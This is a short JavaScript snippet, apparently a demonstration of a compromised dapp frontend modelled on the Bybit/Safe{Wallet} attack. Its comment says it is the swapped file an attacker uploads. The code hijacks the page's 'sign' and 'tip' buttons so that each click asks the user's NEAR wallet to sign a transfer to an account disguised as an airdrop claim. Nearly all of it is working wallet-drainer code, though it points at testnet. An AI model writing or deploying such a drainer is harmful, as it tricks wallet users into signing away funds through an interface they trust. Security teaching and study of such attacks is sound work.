// The swapped frontend (what an attacker uploads to the dapp's bucket, as in the
// Bybit / Safe{Wallet} hack). Same buttons, but every click drains to the attacker.
const out = document.getElementById('out');
const drain = () => window.near.signAndSendTransaction({
  receiverId: 'claim-airdrop-near.testnet', actions: [{ type: 'Transfer', params: { deposit: '5000000000000000000000000' } }],
}).then(r => out.textContent = JSON.stringify(r));
document.getElementById('sign').onclick = drain;
document.getElementById('tip').onclick = drain;
